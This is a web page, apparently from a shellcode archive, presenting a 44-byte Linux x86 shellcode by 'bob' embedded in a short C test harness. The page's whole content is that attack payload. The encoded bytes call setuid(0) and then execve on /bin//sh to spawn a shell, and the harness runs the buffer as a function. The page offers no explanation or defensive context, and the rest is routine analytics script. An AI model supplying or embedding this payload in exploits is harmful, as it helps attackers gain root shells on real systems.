<html><head><title>Linux/x86 - setuid(); execve(); exit(); - 44 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* Linux x86 shellcode by bob */
/* setuid(); execve(); exit(); */

#include &lt;stdio.h&gt;

char shellcode[]=
		&quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80&quot;
		&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
		&quot;\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50&quot;
		&quot;\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0&quot;
		&quot;\xb0\x01\xcd\x80&quot;;
int
main()
{
        void (*dsr) ();
        (long) dsr = &amp;shellcode;
        printf(&quot;Size: %d bytes.\n&quot;, sizeof(shellcode)); 
        dsr();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
